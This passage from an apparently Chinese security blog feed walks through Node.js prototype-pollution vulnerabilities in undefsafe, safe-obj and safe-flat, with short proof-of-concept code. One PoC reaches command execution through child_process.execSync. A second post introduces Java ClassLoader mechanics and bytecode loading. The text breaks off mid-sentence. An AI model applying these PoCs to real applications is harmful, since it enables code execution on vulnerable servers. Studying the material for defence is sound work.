class="hljs-comment">//设置http</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span><br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span><br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="0x05-Undefsafe-中的污染"><a href="#0x05-Undefsafe-中的污染" class="headerlink" title="0x05 Undefsafe 中的污染"></a>0x05 Undefsafe 中的污染</h2><p>Undefsafe模块是用来处理访问对象属性不存在时的报错问题，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;old_value&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">a</span>.<span class="hljs-property">c</span>.<span class="hljs-property">e</span>)  <span class="hljs-comment">//打印不存在的属性</span><br><span class="hljs-comment">//程序报错</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(object,<span class="hljs-string">&#x27;a.c.e&#x27;</span>)) <br><span class="hljs-comment">//undefined</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">a</span>(object,<span class="hljs-string">&#x27;a.b.e&#x27;</span>,<span class="hljs-string">&#x27;new_value&#x27;</span>)) <br><span class="hljs-comment">//new_value</span><br></code></pre></td></tr></table></figure><p>当我们使用undefsafe时，程序就不会报错而是返回<code>undefined</code>，如果目标属性存在，那么undefsafe就可以修改属性的值。如果该属性不存在，我们依然想赋值，那么新的属性将创建在数组中的上一层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">a</span>(object,<span class="hljs-string">&#x27;a.c.e&#x27;</span>,<span class="hljs-string">&#x27;new_value&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object)<br><span class="hljs-comment">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;old_value&#x27; &#125;, e: &#x27;new_value&#x27; &#125; &#125;</span><br></code></pre></td></tr></table></figure><p>漏洞编号CVE-2019-10795，ver &lt; 2.0.3，poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-title function_">a</span>(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;just a evil!&#x27;</span>&#125;)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)   <br><span class="hljs-comment">// this is just a evil!</span><br></code></pre></td></tr></table></figure><p>利用undefsafe对原型对象中的toString方法进行污染，再通过console.log触发，造成任意代码执行。</p><p>可见原型链污染不仅可以修改属性，也可以直接修改方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> test = &#123;&#125;<br><span class="hljs-title function_">a</span>(test,<span class="hljs-string">&#x27;__proto__.toString&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">global</span>.<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;id&#x27;</span>).<span class="hljs-title function_">toString</span>()&#125;)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;this is &#x27;</span>+test)<br><span class="hljs-comment">// this is uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure><h2 id="0x06-safe-obj中的污染"><a href="#0x06-safe-obj中的污染" class="headerlink" title="0x06 safe-obj中的污染"></a>0x06 safe-obj中的污染</h2><h3 id="lodash-amp-safe-obj"><a href="#lodash-amp-safe-obj" class="headerlink" title="lodash &amp; safe-obj"></a>lodash &amp; safe-obj</h3><p>漏洞编号CVE-2021-25928，safe-obj_ver_1.0.0~1.0.2，关键点在expand方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">expand</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">obj, path, thing</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!path &#124;&#124; <span class="hljs-keyword">typeof</span> thing === <span class="hljs-string">&#x27;undefined&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  obj = <span class="hljs-title function_">isObject</span>(obj) &amp;&amp; obj !== <span class="hljs-literal">null</span> ? obj : &#123;&#125;;<br>  <span class="hljs-keyword">var</span> props = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//先用 . 分割</span><br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;  <br>    obj[props.<span class="hljs-title function_">shift</span>()] = thing; <br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">var</span> prop = props.<span class="hljs-title function_">shift</span>(); <span class="hljs-comment">//shift()返回数组第一个元素</span><br>    <span class="hljs-keyword">if</span> (!(prop <span class="hljs-keyword">in</span> obj)) &#123;<br>      obj[prop] = &#123;&#125;;<br>    &#125;<br>    _safe.<span class="hljs-title function_">expand</span>(obj[prop], props.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;.&#x27;</span>), thing);<span class="hljs-comment">//递归调用expand，下一次满足props.length === 1</span><br>  &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p>poc如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> safeObj = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;safe-obj&quot;</span>);<br><span class="hljs-keyword">var</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br>safeObj.<span class="hljs-title function_">expand</span>(obj, <span class="hljs-string">&#x27;__proto__.polluted&#x27;</span>, <span class="hljs-string">&#x27;Yes! Its Polluted&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br><span class="hljs-comment">//Before : undefined</span><br><span class="hljs-comment">//After : Yes! Its Polluted</span><br></code></pre></td></tr></table></figure><h3 id="lodash-amp-safe-flat"><a href="#lodash-amp-safe-flat" class="headerlink" title="lodash &amp; safe-flat"></a>lodash &amp; safe-flat</h3><p>漏洞编号CVE-2021-25927，safe-flat_ver_2.0.0~2.0.1，关键在于unflatten</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">unflatten</span> = (<span class="hljs-params">obj, delimiter</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> result = &#123;&#125;<br>  <span class="hljs-keyword">const</span> seperator = delimiter &#124;&#124; defaultDelimiter<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> &#124;&#124; <span class="hljs-title function_">isDate</span>(obj)) <span class="hljs-keyword">return</span> obj<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">unflat</span> = (<span class="hljs-params">original</span>) =&gt; &#123;<br>    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(original).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> newKeys = key.<span class="hljs-title function_">split</span>(seperator)<br>      newKeys.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">o, k, i</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> o[k] &#124;&#124; (o[k] = <span class="hljs-built_in">isNaN</span>(<span class="hljs-title class_">Number</span>(newKeys[i + <span class="hljs-number">1</span>])) ? (newKeys.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> === i ? original[key] : &#123;&#125;) : [])<br>      &#125;, result)<br>    &#125;)<br>  &#125;<br><br>  <span class="hljs-title function_">unflat</span>(obj)<br>  <span class="hljs-keyword">return</span> result<br>&#125;<br></code></pre></td></tr></table></figure><p>通读代码可以发现实际上unflatten就是指定seperator对obj进行分割并组成新的键值对最后赋值，利用起来也很方便</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> safeFlat = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;safe-flat&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br>safeFlat.<span class="hljs-title function_">unflatten</span>(&#123;<span class="hljs-string">&quot;__proto__.polluted&quot;</span>: <span class="hljs-string">&quot;Yes! Its Polluted&quot;</span>&#125;, <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;After : &quot;</span> + &#123;&#125;.<span class="hljs-property">polluted</span>);<br><span class="hljs-comment">//Before : undefined</span><br><span class="hljs-comment">//After : Yes! Its Polluted</span><br></code></pre></td></tr></table></figure><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p><a href="https://xz.aliyun.com/t/12053#toc-1">关于Prototype Pollution Attack的二三事 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><p><a href="https://www.anquanke.com/post/id/248170#h2-0">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>原型链污染</tag>
      
      <tag>nodejs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ClassLoader</title>
    <link href="/2022/12/28/ClassLoader/"/>
    <url>/2022/12/28/ClassLoader/</url>
    
    <content type="html"><![CDATA[<h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><h2 id="0x00-ByteCode"><a href="#0x00-ByteCode" class="headerlink" title="0x00 ByteCode"></a>0x00 ByteCode</h2><p>​Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。字节码的本质就是一个字节数组 ，它有特定的复杂的内部格式，Java类初始化的时候会调用<strong>java.lang.ClassLoader</strong>加载字节码，.class文件中保存着Java代码经转换后的虚拟机指令，当需要使用某个类时，虚拟机将会加载它的.class文件，并创建对应的class对象，将class文件加载到虚拟机的内存，而在JVM中类的查找与装载就是由<strong>ClassLoader</strong>完成的。</p><img src="/2022/12/28/ClassLoader/image-20230205133431052.png" class="" title="image-20230205133431052"><p>ByteCode2Class脚本: <a href="https://github.com/hengyunabc/dumpclass">https://github.com/hengyunabc/dumpclass</a></p><h2 id="0x01-显式与隐式加载"><a href="#0x01-显式与隐式加载" class="headerlink" title="0x01 显式与隐式加载"></a>0x01 显式与隐式加载</h2><p>Java类加载方式分为显式和隐式</p><ul><li>显式：利用反射来加载一个类，Class.forName()等。</li><li>隐式：通过ClassLoader来动态加载，new 一个类或者 类名.方法名返回一个类。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadClassTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//1、反射加载，显式加载。</span><br>    Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    System.out.println(aClass.getName());<br><br>    <span class="hljs-comment">//2、ClassLoader加载，隐式加载。</span><br>    Class&lt;?&gt; aClass1 = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>    System.out.println(aClass1.getName());<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-ClassLoader"><a href="#0x02-ClassLoader" class="headerlink" title="0x02 ClassLoader"></a>0x02 ClassLoader</h2><p>ClassLoader（类加载器）主要作用就是将class文件读入内存，并为之生成对应的java.lang.Class对象。</p><p>ClassLoader中的一些核心方法有：</p><ol><li><strong>loadClass(加载指定的Java类)</strong></li><li><strong>findClass(查找指定的Java类)</strong></li><li><strong>findLoadedClass(查找JVM已经加载过的类)</strong></li><li><strong>defineClass(定义一个Java类)</strong></li><li><strong>resolveClass(链接指定的Java类)</strong></li></ol><p>当我们正常加载一个Class的时候，方法的执行顺序也如上所示。</p><h3 id="内置ClassLoader"><a href="#内置ClassLoader" class="headerlink" title="内置ClassLoader"></a>内置ClassLoader</h3><p>JVM中存在3个内置ClassLoader：</p><ol><li>BootstrapClassLoader <strong>启动类加载器</strong> 负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME&#x2F;lib&#x2F;rt.jar 文件中，我们常用内置库 java.xxx.* 都在里面，比如 <strong>java.util.*、java.io.*、java.nio.*、java.lang.*</strong> 等等。</li><li>ExtensionClassLoader <strong>扩展类加载器</strong> 负责加载 JVM 扩展类，比如 swing 系列、内置的 js 引擎、xml 解析器 等等，这些库名通常以 javax 开头，它们的 jar 包位于 JAVA_HOME&#x2F;lib&#x2F;ext&#x2F;*.jar 中</li><li>AppClassLoader <strong>系统类加载器</strong> 才是直接面向我们用户的加载器，它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录。<strong>我们自己编写的代码以及使用的第三方 jar 包通常都是由它来加载的</strong>。</li></ol><h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><p>除了内置的这三个ClassLoader，我们还可以<strong>自定义ClassLoader</strong>，自定义ClassLoader必须继承java.lang.ClassLoader类。一个简单的demo为例，定义一个类并获取其字节码再利用自定义ClassLoader加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Person.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> String id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String id,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.id=id;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;func hello called.&quot;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//Util.java</span><br><span class="hljs-keyword">import</span> java.net.URI;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Util</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getByteArray</span><span class="hljs-params">(String className)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>      <span class="hljs-type">URI</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> Util.class.getClassLoader().getResource(className+<span class="hljs-string">&quot;.class&quot;</span>).toURI();<br>      <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(uri));<br>      <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br>      <span class="hljs-keyword">return</span> base64;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写自定义ClassLoader，并重写findClass()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//MyClassLoader.java</span><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Person&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] byteArray;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            byteArray = Util.getByteArray(className);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//只处理Person类</span><br>        <span class="hljs-keyword">if</span> (name.equals(className))&#123;<br>            <span class="hljs-keyword">return</span> defineClass(className, byteArray, <span class="hljs-number">0</span>, byteArray.length );<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.findClass(name);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">MyClassLoader</span> <span class="hljs-variable">myClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClassLoader</span>();<br>        Class&lt;?&gt; aClass = myClassLoader.loadClass(className);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br>        <span class="hljs-comment">//调用Person类的hello()</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;hello&quot;</span>);<br>        m.invoke(o);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出: func hello called.</span><br><br></code></pre></td></tr></table></figure><h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><p>双亲委派模型展示了类的实际加载过程以及ClassLoader的使用顺序。</p><img src="/2022/12/28/ClassLoader/image-20230205142823459.png" class="" title="image-20230205142823459"><p>先不考虑自定义ClassLoader，加入我们编写一个普通类，那么它的加载过程就可以用上图来表示。</p><p>双亲委派可以简单理解为：<strong>向上委派，向下加载</strong></p><p>当一个.class文件要被加载时首先会在AppClassLoader检查是否已被加载，如果加载过就不再加载，如果没有被加载则向上，也就是父加载器委派，父加载器重复这个过程直到BootstrapClassLoader，如果BootstrapClassLoader也没有加载过此类则开始向下加载；首先询问BootstrapClassLoader是否可以加载，如果可以就自己加载，如果不可以则向下加载；子加载器重复这个过程直到AppClassloader，如果AppClassloader也无法加载则抛出ClassNotFoundException异常。</p><p><strong>如果我们自定义了ClassLoader并加载类，那么就会先从自定义ClassLoader开始加载，顺序上先于AppClassLoader。</strong></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>从双亲委派模型来理解上文中几个方法(loadClass、findClass….)：</p><ul><li>如果我们要自定义加载一个类，那么首先调用loadClass去检查这个类是否被加载过，同样是向上委派的过程。如果没有发现类被记载则调用findClass。</li><li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass 。</li><li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类。</li></ul><p>值得注意的是，defineClass方法并不会调用类的静态代码块或者构造方法，相关的调用如下：</p><ul><li>初始化：静态代码块</li><li>实例化：构造代码块\无参构造函数</li></ul><p>而使用Class.forName进行动态类加载有两种模式，初始化与不初始化，<strong>默认是初始化</strong>。</p><p>指定初始化会调用静态代码块，禁止初始化不会调用静态代码块。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//默认开启初始化</span><br>Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<br><span class="hljs-comment">//关闭初始化</span><br>Class.forName(<span class="hljs-string">&quot;Person&quot;</span>,<span class="hljs-literal">false</span>,getSystemClassLoader());<br><br></code></pre></td></tr></table></figure><h2 id="0x03-加载字节码的几种方式"><a href="#0x03-加载字节码的几种方式" class="headerlink" title="0x03 加载字节码的几种方式"></a>0x03 加载字节码的几种方式</h2><h3 id="1-利用defineClass"><a href="#1-利用defineClass" class="headerlink" title="1.利用defineClass()"></a>1.利用defineClass()</h3><p>上面已经提到defineClass()会将Class转换成类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method; <br><span class="hljs-keyword">import</span> java.util.Base64; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123; <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123; <br><span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> <br>ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <br><span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class); <br>defineClass.setAccessible(<span class="hljs-literal">true</span>); <br><span class="hljs-type">byte</span>[] code = <br>Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>); <br><span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length); <br>hello.newInstance(); <br>&#125; <br>&#125; <br></code></pre></td></tr></table></figure><h3 id="2-利用URLClassLoader"><a href="#2-利用URLClassLoader" class="headerlink" title="2.利用URLClassLoader"></a>2.利用URLClassLoader</h3><p>URLClassLoader 实际上是我们平时默认使用的 AppClassLoader 的父类，所以，我们解释URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><ol><li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且<strong>协议名是 file</strong> ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</p></li><li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 